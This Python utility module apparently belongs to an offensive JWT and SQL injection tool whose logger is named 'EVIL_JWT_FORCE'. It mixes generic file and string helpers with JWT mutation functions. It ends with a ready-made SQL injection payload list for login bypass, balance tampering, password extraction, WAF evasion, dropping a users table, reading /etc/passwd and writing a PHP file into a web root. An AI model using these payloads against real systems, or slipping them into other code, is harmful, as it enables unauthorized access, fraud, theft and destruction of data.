import os
import json
import threading
import hashlib
import base64
import random
import string
import time
import re
import math
import tempfile
import shutil
from typing import Any, Dict, List, Optional, Union
import logging
import utils.constants as constants

def save_to_file(data: Union[str, bytes, dict, list], filepath: str, mode: str = "w", encoding: Optional[str] = "utf-8") -> None:
    if isinstance(data, (dict, list)):
        with open(filepath, mode, encoding=encoding) as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    elif isinstance(data, bytes):
        with open(filepath, "wb") as f:
            f.write(data)
    else:
        with open(filepath, mode, encoding=encoding) as f:
            f.write(str(data))

def read_lines(filepath: str, encoding: Optional[str] = "utf-8") -> List[str]:
    if not os.path.exists(filepath):
        return []
    with open(filepath, "r", encoding=encoding) as f:
        return [line.rstrip("\n") for line in f]

def write_lines(filepath: str, lines: list, encoding: str = "utf-8") -> None:
    with open(filepath, "w", encoding=encoding) as f:
        for line in lines:
            f.write(f"{line}\n")

def load_from_file(filepath: str, mode: str = "r", encoding: Optional[str] = "utf-8") -> Any:
    if not os.path.exists(filepath):
        return None
    if filepath.endswith(".json"):
        with open(filepath, mode, encoding=encoding) as f:
            return json.load(f)
    elif "b" in mode:
        with open(filepath, mode) as f:
            return f.read()
    else:
        with open(filepath, mode, encoding=encoding) as f:
            return f.read()

def random_string(length: int = 12, charset: str = string.ascii_letters + string.digits) -> str:
    return ''.join(random.choices(charset, k=length))

def hash_string(data: str, algorithm: str = "sha256") -> str:
    h = hashlib.new(algorithm)
    h.update(data.encode("utf-8"))
    return h.hexdigest()

def base64_encode(data: Union[str, bytes]) -> str:
    if isinstance(data, str):
        data = data.encode("utf-8")
    return base64.b64encode(data).decode("utf-8")

def base64_decode(data: str) -> bytes:
    return base64.b64decode(data)

def thread_run(target, args=(), kwargs=None, daemon=True) -> threading.Thread:
    if kwargs is None:
        kwargs = {}
    t = threading.Thread(target=target, args=args, kwargs=kwargs, daemon=daemon)
    t.start()
    return t

def safe_mkdir(path: str) -> None:
    os.makedirs(path, exist_ok=True)

def is_json(data: str) -> bool:
    try:
        json.loads(data)
        return True
    except Exception:
        return False

def chunk_list(lst: List[Any], size: int) -> List[List[Any]]:
    return [lst[i:i+size] for i in range(0, len(lst), size)]

def retry(func, retries: int = 3, delay: float = 1.0, exceptions: tuple = (Exception,)):
    for attempt in range(retries):
        try:
            return func()
        except exceptions:
            if attempt == retries - 1:
                raise
            time.sleep(delay)

def generate_nonce(length: int = 16) -> str:
    """Generate a unique nonce value."""
    return random_string(length, string.ascii_letters + string.digits)

def get_current_timestamp() -> str:
    """Return the current timestamp as a formatted string."""
    return time.strftime("%Y-%m-%d %H:%M:%S")

def formatted_time() -> str:
    """Return the current timestamp as a formatted string."""
    return time.strftime("%Y-%m-%d %H:%M:%S")

def save_to_output(filepath: str, data: Union[str, dict, list], mode: str = "w", encoding: Optional[str] = "utf-8") -> None:
    """Save data to an output file."""
    save_to_file(data, filepath, mode, encoding)

def log_format(level: str, message: str) -> str:
    """Format a log message with timestamp and level."""
    return f"{formatted_time()} [{level}] {message}"

def ensure_dir(path: str) -> None:
    """Ensure a directory exists, creating it if necessary."""
    os.makedirs(path, exist_ok=True)

def clean_string(text: str) -> str:
    """Clean a string by removing unwanted characters and normalizing it."""
    return text.strip().replace("\n", "").replace("\r", "")

def is_valid_url(url: str) -> bool:
    """Check if a string is a valid URL."""
    pattern = r'^https?://[\w\-.]+(:\d+)?(/[\w\-./?%&=]*)?$'
    return bool(re.match(pattern, url))

def safe_write_file(filepath: str, data: Union[str, bytes, dict, list], mode: str = "w", encoding: Optional[str] = "utf-8") -> None:
    """Safely write data to a file, ensuring the directory exists."""
    ensure_dir(os.path.dirname(filepath))
    save_to_file(data, filepath, mode, encoding)

def slugify(text: str) -> str:
    """Convert a string to a slug format."""
    text = text.lower()
    text = re.sub(r'[^a-z0-9\s-]', '', text)
    text = re.sub(r'[\s]+', '-', text)
    return text

def human_size(size_bytes: int) -> str:
    """Convert a size in bytes to a human-readable format."""
    if size_bytes == 0:
        return "0B"
    size_name = ("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
    i = int(math.floor(math.log(size_bytes, 1024)))
    p = math.pow(1024, i)
    s = round(size_bytes / p, 2)
    return f"{s} {size_name[i]}"

def atomic_write(filepath: str, data: Union[str, bytes, dict, list], mode: str = "w", encoding: Optional[str] = "utf-8") -> None:
    """Atomically write data to a file to prevent corruption."""
    ensure_dir(os.path.dirname(filepath))
    with tempfile.NamedTemporaryFile(mode=mode if isinstance(data, str) else 'wb', dir=os.path.dirname(filepath), delete=False, encoding=encoding if isinstance(data, str) else None) as temp_file:
        if isinstance(data, (dict, list)):
            json.dump(data, temp_file, ensure_ascii=False, indent=2)
        elif isinstance(data, bytes):
            temp_file.write(data)
        else:
            temp_file.write(str(data))
        temp_file_path = temp_file.name
    shutil.move(temp_file_path, filepath)

def touch(filepath: str) -> None:
    """Create an empty file if it does not exist."""
    ensure_dir(os.path.dirname(filepath))
    if not os.path.exists(filepath):
        with open(filepath, 'a'):
            os.utime(filepath, None)

def remove_file(filepath: str) -> None:
    """Remove a file if it exists."""
    if os.path.exists(filepath):
        os.remove(filepath)

def list_files(directory: str, extension: str = '') -> List[str]:
    """List files in a directory, optionally filtering by extension."""
    files = []
    for root, _, filenames in os.walk(directory):
        for filename in filenames:
            if extension and not filename.endswith(extension):
                continue
            files.append(os.path.join(root, filename))
    return files

def log_event(event_type: str, message: str, level: str = "INFO") -> None:
    """
    Log an event with a specific type and message.
    
    Args:
        event_type (str): The type of event being logged.
        message (str): The message to log.
        level (str): The logging level (INFO, WARNING, ERROR).
    """
    logger = logging.getLogger("EVIL_JWT_FORCE.event")
    if level.upper() == "ERROR":
        logger.error(f"[{event_type}] {message}")
    elif level.upper() == "WARNING":
        logger.warning(f"[{event_type}] {message}")
    else:
        logger.info(f"[{event_type}] {message}")

def generate_jwt_list(base_token, variations=10):
    """Gera uma lista de tokens JWT com variações baseadas no token fornecido."""
    jwt_list = [base_token]
    for i in range(variations):
        # Simples variação placeholder (pode ser expandida)
        jwt_list.append(f"{base_token}_{i}")
    return jwt_list

def mutate_jwt(token):
    """Cria mutações de um token JWT para testes de fuzzing."""
    mutations = []
    parts = token.split('.')
    if len(parts) == 3:
        header, payload, signature = parts
        mutations.append(f"{header}.{payload}.mutated_signature")
        mutations.append(f"mutated_header.{payload}.{signature}")
        mutations.append(f"{header}.mutated_payload.{signature}")
    return mutations

def analyze_jwt_response(response):
    """Analisa a resposta de um teste JWT para determinar se foi bem-sucedido."""
    if response.status_code in [200, 201, 202]:
        return {'success': True, 'reason': 'Resposta bem-sucedida'}
    return {'success': False, 'reason': f'Código de status {response.status_code}'}

def is_jwt(token):
    """Verifica se uma string é um token JWT válido (formato básico)."""
    parts = token.split('.')
    if len(parts) != 3:
        return False
    try:
        import base64
        # Verifica se as partes podem ser decodificadas como Base64
        base64.b64decode(parts[0] + '==')
        base64.b64decode(parts[1] + '==')
        return True
    except Exception:
        return False

def load_payloads(payload_type):
    """
    Load payloads based on the specified type.
    Args:
        payload_type (str): The type of payloads to load.
    Returns:
        list: A list of payloads for the specified type.
    """
    payloads = {
        'Detecção Básica': ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #", "' OR 1=1 --"],
        'Bypass de Autenticação': ["admin' --", "admin' #", "admin'/*", "' OR '1'='1"], 
        'Manipulação de Saldo': ["' UNION SELECT 1,2,3,4,5,6,7,8,9,10, balance=9999 FROM users WHERE id=1 --"],
        'Extração de Dados': ["' UNION SELECT 1,2,3,4,5,6,7,8,9,10, username, password FROM users --"],
        'Injeção Cega': ["' AND 1=1 --", "' AND 1=2 --", "' AND SLEEP(5) --"],
        'Bypass WAF': ["' /*!50000OR*/ '1'='1", "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3 --"],
        'Stacked Queries': ["'; DROP TABLE users; --", "'; UPDATE users SET balance=9999 WHERE id=1; --"],
        'Extração de Arquivos': ["' UNION SELECT 1,2,3,4,5,6,7,8,9,10, LOAD_FILE('/etc/passwd') --"],
        'Escrita em Arquivo': ["' UNION SELECT 1,2,3,4,5,6,7,8,9,10, '<?php phpinfo(); ?>' INTO OUTFILE '/var/www/html/shell.php' --"],
        'Bypass de Filtros': ["' O/**/R '1'='1", "' /*!50000OR*/ '1'='1", "' UN/**/ION SEL/**/ECT 1,2,3 --"]
    }
    return payloads.get(payload_type, [])

def get_default_timeout():
    """Return the default timeout constant dynamically."""
    return constants.DEFAULT_TIMEOUT